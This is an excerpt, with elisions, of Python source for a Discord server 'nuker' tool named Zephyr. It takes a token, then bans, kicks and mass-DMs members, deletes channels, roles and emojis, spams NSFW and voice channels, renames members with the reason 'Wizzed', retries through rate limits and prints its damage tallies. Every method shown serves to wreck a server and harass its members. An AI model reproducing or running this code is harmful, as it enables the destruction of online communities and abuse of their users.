...
token = input(f'\033[37m> \033[37mToken\033[37m: \033[37m')
...
class Zephyr:
    ...
    def BanAll(self, guild, member, reason):
        ...
        while True:
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Banned{self.color} {member}\033[37m")
                ban_count += 1
                break
                ...
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Ban{self.color} {member}\033[37m")
                break
    ...
    def KickAll(self, guild, member, reason):
        ...
        while True:
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Kicked{self.color} {member}\033[37m")
                kick_count += 1
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ...
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Kick{self.color} {member}\033[37m")
                break
    ...
    def CreateNsfwChannels(self, guild, name):
        global nsfw_channels_created
        nsfw_channels_created = 0
        while True:
    ...
    def DeleteChannels(self, guild, channel):
        ...
        while True:
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Deleted Channel{self.color} {channel}\033[37m")
                deleted_channels += 1
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ...
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Delete Channel{self.color} {channel}\033[37m")
                break
    
    def DeleteRoles(self, guild, role):
        global deleted_roles
        deleted_roles = 0
        while True:
            json = {
                'reason': 'Wizzed'
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Deleted Role{self.color} {role}\033[37m")
                deleted_roles += 1
                break
                ...
                print(f"{self.color}[\033[37m!{self.color}]\033[37m Couldn't Delete Role{self.color} {role}\033[37m")
                break

    def DeleteEmojis(self, guild, emoji):
        global deleted_emojis
        deleted_emojis = 0
        while True:
            json = {
                'reason': 'Wizzed'
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Deleted Emoji{self.color} {emoji}\033[37m")
                deleted_emojis += 1
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ...
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Delete Emoji{self.color} {emoji}\033[37m")
                break

    def NicknameMembers(self, guild, member, name):
        global nicknamed_members
        nicknamed_members = 0
        while True:
            json = {
                'nick': name
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Nicknamed{self.color} {member}\033[37m")
                nicknamed_members += 1
                break
            elif r.status_code == 429:
                retryint = r.json()['retry_after']
                ...
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't Nickname{self.color} {member}\033[37m")
                break
    ...
    def DMAll(self, guild, member, message):
        ...
        while True:
            ...
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{self.color}[\033[37m+{self.color}]\033[37m Messaged{self.color} {member}\033[37m")
                members_dmed += 1
                break
                ...
                print(f"{self.color}[\033[37m-{self.color}]\033[37m Couldn't DM{self.color} {member}\033[37m")
                break
    ...
    async def NukeExecute(self):
        ...
        sleep(1)
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Banned {self.color}{ban_count}\033[37m Members")
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Deleted {self.color}{deleted_channels}\033[37m Channels")
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Deleted {self.color}{deleted_roles}\033[37m Roles")
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Deleted {self.color}{deleted_emojis}\033[37m Emojis")
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Created {self.color}{created_channels}\033[37m Channels")
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Created {self.color}{created_roles}\033[37m Roles")
    ...
    async def DmAllExecute(self):
        ...
        sleep(1)
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Messaged {self.color}{members_dmed}\033[37m Members")
    ...
    async def PruneMembersExecute(self):
        ...
        sleep(1)
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Pruned {self.color}{roles_pruned}\033[37m Roles")
    ...
    async def KickExecute(self):
        ...
        sleep(1)
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Kicked {self.color}{kick_count}\033[37m Members")
    ...
    async def VoiceChannelSpamExecute(self):
        ...
        sleep(1)
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Created {self.color}{created_voice_channels}\033[37m Voice Channels")
    ...
    async def NsfwChannelSpamExecute(self):
        ...
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Created {self.color}{nsfw_channels_created}\033[37m Nsfw Channels")
    ...
    async def NicknameMembersExecute(self):
        ...
        sleep(1)
        print(f"{self.color}[\033[37m!{self.color}]\033[37m Nicknamed {self.color}{nicknamed_members}\033[37m Members")
    ...
    async def SetStatus(self):
        ...
        print(f'''
                            ...
                            \033[37m╚═╝╚═╝╩  ╩ ╩ ╩ ╩╚═  
                    {self.color}╔════════════════════╦════════════════╗      
                    {self.color}║ {self.color}[\033[37mSTATUS{self.color}]           ║{self.color} [\033[37mMODE{self.color}]         ║
                    {self.color}║ {self.color}[\033[37m1{self.color}] \033[37mGame{self.color}           ║ {self.color}[\033[37m1{self.color}] \033[37mOnline{self.color}     ║
                    {self.color}║ {self.color}[\033[37m2{self.color}] \033[37mStreaming{self.color}      ║ {self.color}[\033[37m2{self.color}] \033[37mDND{self.color}        ║
                    {self.color}║ {self.color}[\033[37m3{self.color}] \033[37mWatching{self.color}       ║ {self.color}[\033[37m3{self.color}] \033[37mIdle{self.color}       ║
                    {self.color}║ {self.color}[\033[37m4{self.color}] \033[37mListening{self.color}      ║ {self.color}[\033[37m4{self.color}] \033[37mInvisible{self.color}  ║
                    {self.color}║ {self.color}[\033[37m5{self.color}] \033[37mMenu{self.color}           ║ {self.color}[\033[37mX{self.color}] \033[37mExit{self.color}       ║
                    {self.color}╚════════════════════╩════════════════╝            
        \033[37m''')
